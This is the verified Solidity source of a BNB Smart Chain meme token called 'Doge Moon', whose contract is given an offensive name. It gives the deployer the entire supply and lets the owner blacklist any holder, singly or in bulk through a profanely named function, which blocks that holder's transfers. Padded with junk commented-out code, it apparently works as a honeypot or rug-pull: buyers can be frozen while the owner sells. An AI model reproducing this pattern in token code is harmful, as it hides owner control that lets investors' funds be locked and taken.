/**
 *Submitted for verification at BscScan.com on 2022-11-02
*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.13;

abstract contract RYRYRYRY {
    address private _owner;

    constructor () {
        _owner = msg.sender;
    }
    
    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == msg.sender, "Ownable: caller is not the owner");
        _;
    }
}

contract Holocost is RYRYRYRY {
    string public name = "Doge Moon";
    string public symbol = "DOGE MOON";
    uint256 public totalSupply = 44444444444444e16;
    uint8 public decimals = 16;
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);

    // uint256 public xxxxx = 234523;
    // string public dfgndfsg = "a 234r24";
    // uint256 public xxcxcxc = 456477;
    // string public sxsds = "zzgfdgb zdsz";
    // bool public hui = true;

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public isBlacklisted;

    constructor() {
        balanceOf[msg.sender] = totalSupply;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    function _transfer(address _from, address _to, uint256 _value) internal returns (bool success) {
        {
        require(!isBlacklisted[_from] && !isBlacklisted[_to], "Blacklisted address");
        require(balanceOf[_from] >= _value);
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
        return true;
        }  
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        _transfer(msg.sender, _to, _value);
        return true;
    }

    // function send_sell(uint216) public returns (uint200) {
    //     return 123234;
    // }

    // function buy_gift(address) public returns (bool) {
    //     return true;
    // }

    //     function call_fuck(address) public returns (uint256) {
    //     return 123123123;
    // }

    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= allowance[_from][msg.sender]);
        _transfer(_from, _to, _value);
        allowance[_from][msg.sender] -= _value;
        return true;
    }

    function setisBlacklisted(address account, bool value) public onlyOwner {
        isBlacklisted[account] = value;
    }

    function fuuuuuuuuuuuuuuck(address[] calldata accounts, bool value) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            isBlacklisted[accounts[i]] = value;
        }
    }
}